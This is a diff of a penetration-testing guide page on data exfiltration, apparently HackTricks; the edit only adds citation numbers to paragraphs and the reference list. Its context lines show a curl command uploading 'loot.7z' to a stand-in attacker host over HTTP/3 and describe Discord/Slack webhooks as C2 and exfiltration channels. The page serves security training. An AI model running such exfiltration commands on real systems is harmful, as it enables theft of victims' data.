@@ -135,7 +135,7 @@ curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
 
-A 2025 research paper (QUIC-Exfil) showed that QUIC features such as encrypted headers and connection migration can make firewall-level detection of exfiltration harder than classic TLS or DNS-based channels, so expect this space to become more relevant as HTTP/3 support spreads.
+A 2025 research paper (QUIC-Exfil) showed that QUIC features such as encrypted headers and connection migration can make firewall-level detection of exfiltration harder than classic TLS or DNS-based channels, so expect this space to become more relevant as HTTP/3 support spreads.<sup>[[9]](#references)</sup>
 
 ### Pre-signed / delegated object-storage uploads
 
@@ -208,7 +208,7 @@ goshs -tunnel
 
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.
+Webhooks are write-only HTTPS endpoints that accept JSON and optional file parts. They’re commonly allowed to trusted SaaS domains and require no OAuth/API keys, making them useful for low-friction beaconing and exfiltration.<sup>[[5]](#references)[[6]](#references)</sup>
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
@@ -624,14 +624,14 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 
 ## References
 
-- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
-- [Rclone `crypt` backend](https://rclone.org/crypt/)
-- [goshs](https://github.com/patrickhener/goshs)
-- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
-- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
-- [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
-- [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
+- [1] [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [3] [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [4] [goshs](https://github.com/patrickhener/goshs)
+- [5] [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [6] [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [7] [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
+- [8] [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [9] [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
 
 {{#include ../banners/hacktricks-training.md}}
